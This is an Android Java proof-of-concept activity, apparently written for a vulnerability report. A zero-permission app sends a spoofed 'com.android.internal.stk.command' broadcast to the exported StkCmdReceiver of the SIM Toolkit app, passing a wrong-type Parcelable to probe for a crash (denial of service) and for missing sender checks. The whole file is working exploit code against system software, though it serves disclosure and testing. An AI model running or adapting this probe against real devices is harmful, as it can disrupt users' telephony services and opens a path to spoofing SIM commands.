package com.vrp.zeroperm;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

// StkCmdReceiver (com.android.stk) is exported, no permission, handles
// com.android.internal.stk.command (normally sent only by the telephony
// framework reacting to a REAL SIM card STK proactive command) with zero
// sender validation. It forwards the attacker-controlled "STK CMD" Parcelable
// extra straight into StkAppService. This probes whether a type-mismatched
// Parcelable crashes the receiving process (DoS), and whether the broadcast
// is accepted at all with zero permissions.
public class StkSpoofActivity extends Activity {
    private static final String T = "STK_SPOOF";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== StkCmdReceiver zero-permission broadcast probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions)");

        try {
            Intent intent = new Intent("com.android.internal.stk.command");
            intent.setClassName("com.android.stk", "com.android.stk.StkCmdReceiver");
            intent.putExtra("SLOT_ID", 0);
            // Wrong-type Parcelable in place of the expected CatCmdMessage
            intent.putExtra("STK CMD", new Bundle());
            sendBroadcast(intent);
            Log.w(T, "[+] sendBroadcast() completed without SecurityException");
        } catch (SecurityException se) {
            Log.w(T, "[-] SecurityException: " + se.getMessage());
        } catch (Exception e) {
            Log.w(T, "[-] Exception: " + e);
        }
    }
}
